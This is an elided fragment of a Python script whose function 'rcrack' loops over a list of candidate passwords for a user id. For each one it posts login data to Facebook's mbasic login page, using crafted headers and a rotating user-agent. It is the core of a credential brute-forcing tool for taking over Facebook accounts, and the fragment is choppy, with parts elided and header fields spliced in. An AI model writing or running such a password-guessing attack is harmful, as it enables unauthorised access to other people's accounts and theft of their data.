...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "method": 'GET',
            "scheme": 'https',
            'path': 'login/?li=jI8dZC27bk83UG6KiuSPvjPv&e=1348029&shbl=1&refsrc=deprecated&rtime=1679663392&hrc=1&_rdr',
            ...
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=jI8dZC27bk83UG6KiuSPvjPv&e=1348029&shbl=1&refsrc=deprecated&rtime=1679663392&hrc=1&_rdr',data=log_data,headers=header_freefb).text
